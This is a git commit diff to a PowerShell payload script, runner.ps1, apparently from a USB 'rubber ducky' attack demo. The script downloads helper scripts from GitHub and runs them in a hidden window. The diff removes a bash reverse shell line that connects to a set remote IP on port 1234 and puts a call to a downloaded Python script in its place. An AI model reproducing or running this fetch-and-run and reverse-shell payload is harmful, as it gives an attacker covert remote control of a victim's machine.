747badb72ff944497451a47e5d90ca44c6553ec0
Lasse Alm <lassealm2@gmail.com>
2023-02-20 16:30:05 +0100

    Update runner.ps1

--- runner.ps1
+++ runner.ps1
@@ -1,7 +1,8 @@
 $RHOST = '172.18.141.67'
 
 curl https://raw.githubusercontent.com/lassemand/rubberducky_demo/master/helper.ps1 -O .\helper.ps1
+curl https://raw.githubusercontent.com/lassemand/rubberducky_demo/master/test.py -O .\test.py
 
 Start-Process -WindowStyle hidden -FilePath powershell.exe -ArgumentList "-NoExit -Command .\helper.ps1"
 
-bash -c 'exec bash -i &>/dev/tcp/$RHOST/1234 <&1'
+python test.py
